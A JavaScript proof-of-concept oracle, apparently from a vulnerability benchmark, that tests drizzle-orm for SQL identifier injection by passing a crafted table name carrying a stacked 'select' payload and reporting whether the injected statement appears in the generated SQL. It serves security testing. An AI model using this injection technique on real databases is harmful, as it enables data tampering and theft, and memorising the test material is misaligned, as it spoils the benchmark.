let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const orm = require('drizzle-orm');
  const sqlite = require('drizzle-orm/sqlite-core');

  if (!orm || typeof orm.sql !== 'function') throw new Error('missing_sql_tag');
  if (!sqlite || typeof sqlite.sqliteTable !== 'function' || typeof sqlite.text !== 'function') {
    throw new Error('missing_sqlite_core_exports');
  }

  const { sql } = orm;
  const { sqliteTable, text } = sqlite;

  const cfg = {
    escapeName: (n) => `"${String(n).replace(/"/g, '""')}"`,
    escapeParam: () => '?',
    escapeString: (s) => `'${String(s).replace(/'/g, "''")}'`,
    casing: { getColumnCasing: (c) => c.name },
    paramStartIndex: { value: 0 },
    inlineParams: false,
  };

  const benignTbl = sqliteTable('users', { id: text('id') });
  const benignQ = sql`select ${benignTbl.id} from ${benignTbl}`;
  if (!benignQ || typeof benignQ.toQuery !== 'function') throw new Error('benign_missing_toQuery');
  const benignSql = String((benignQ.toQuery(cfg) || {}).sql || '');
  if (!/select\s+"users"\."id"\s+from\s+"users"/i.test(benignSql)) {
    throw new Error('benign_sql_unexpected:' + benignSql);
  }

  operation_completed = true;

  const marker = 'drizzle_ident_marker_b6e9f0';
  const payload = `x";select '${marker}' as p;--`;
  const evilTbl = sqliteTable(payload, { c: text('c') });
  const malQ = sql`select ${evilTbl.c} from ${evilTbl}`;
  const malSql = String((malQ.toQuery(cfg) || {}).sql || '');

  // Vulnerable behavior: payload appears as active SQL tokens instead of a safely quoted identifier.
  // Patched behavior should throw OR produce quoted identifier where payload remains inert.
  const hasInjectedSelect = /;\s*select\s+'drizzle_ident_marker_b6e9f0'\s+as\s+p\s*;?/i.test(malSql);
  exploit_succeeded = hasInjectedSelect;
  evidence = JSON.stringify({ benignSql, malSql, hasInjectedSelect });
} catch (err) {
  const msg = err && err.message ? err.message : String(err);
  if (!operation_completed) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_error:' + msg;
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_or_error:' + msg;
  }
}

emit();